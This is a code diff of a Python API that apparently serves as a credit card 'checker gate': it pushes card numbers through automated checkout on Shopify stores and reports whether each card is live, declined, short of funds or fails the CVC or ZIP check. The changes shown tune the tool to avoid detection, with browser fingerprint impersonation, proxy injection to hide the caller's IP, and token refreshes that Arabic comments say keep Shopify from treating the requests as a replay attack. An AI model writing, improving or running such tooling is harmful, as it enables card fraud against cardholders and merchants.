@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V28 (Ghost Proxy)"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V29 (Sync Master)"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -47,11 +47,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": "8 The Green", "city": "Dover", "province": "DE", "zip": "19901", "country": "US", "phone": "3025551234"
         }
 
-        # 🔥 التحديث الجذري: حقن البروكسي مباشرة في الـ Session لمنع تسريب الـ IP
         with requests.Session(impersonate="chrome120", proxies=proxies) as session:
             session.verify = False
-            
-            # تم حذف الهيدرز اليدوية بالكامل لترك بصمة المتصفح نقية بدون تشويه
 
             variant_id, price = None, "-"
             ep = f"{store_url}/products.json?limit=250"
@@ -190,9 +187,18 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []
                     }]
                 },
-                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": None, "rememberMe": False}
+                "buyerIdentity": {
+                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"}, 
+                    "email": buyer["email"], 
+                    "emailChanged": False, 
+                    "phoneCountryCode": "US", 
+                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": buyer["email"]}}], 
+                    "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, 
+                    "rememberMe": False
+                }
             }
             
+            # 🔥 الضربة الأولى: تحفيز السيرفر للحساب
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json = res_prop.json()
             
@@ -204,9 +210,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             
             time.sleep(4.5)
             
+            # 🔥 الضربة الثانية: الحصول على الأسعار النهائية
             res_prop2 = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json2 = res_prop2.json()
             negotiate_res = res_prop_json2.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
+
+            # 🔥 الإصلاح القاتل: تحديث توكن الطابور عشان شوبي فاي ميعتبرناش Replay Attack!
+            new_queue_token = negotiate_res.get('queueToken')
+            if new_queue_token:
+                queue_token = new_queue_token
 
             seller_proposal = negotiate_res.get('sellerProposal', {})
             
@@ -273,10 +285,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}...on SubmitRejected{__typename errors{code localizedMessage}}...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}}}"""
             
             sub_vars = {
-                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
+                "attemptToken": f"{checkout_token}-{int(time.time())}",
                 "input": {
                     "sessionInput": {"sessionToken": session_token},
-                    "queueToken": queue_token,
+                    "queueToken": queue_token, # التوكن الجديد المعتمد!
                     "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                     "delivery": {
                         "deliveryLines": [{
@@ -311,7 +323,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         }],
                         "billingAddress": {"streetAddress": flat_address}
                     },
-                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False}
+                    "buyerIdentity": {
+                        "customer": {"presentmentCurrency": currency, "countryCode": "US"}, 
+                        "email": buyer["email"], 
+                        "emailChanged": False, 
+                        "phoneCountryCode": "US", 
+                        "marketingConsent": [{"email": {"consentState": "DECLINED", "value": buyer["email"]}}], 
+                        "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, 
+                        "rememberMe": False
+                    }
                 }
             }
             
@@ -355,6 +375,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 if not receipt_id:
                     err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
                     if err:
+                        if err == 'CARD_DECLINED':
+                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price))
                         return JSONResponse(content=safe_response(f"Declined: {err}", res_sub_text[:400], price))
                     return JSONResponse(content=safe_response("Order processing 💎", "No Receipt ID", price))
             elif not sub_typename:
@@ -376,6 +398,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
                     elif p_type == 'FailedReceipt':
                         err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
+                        if err == 'CARD_DECLINED':
+                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price))
                         if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", err, price))
                         elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", err, price))
                         elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", err, price))
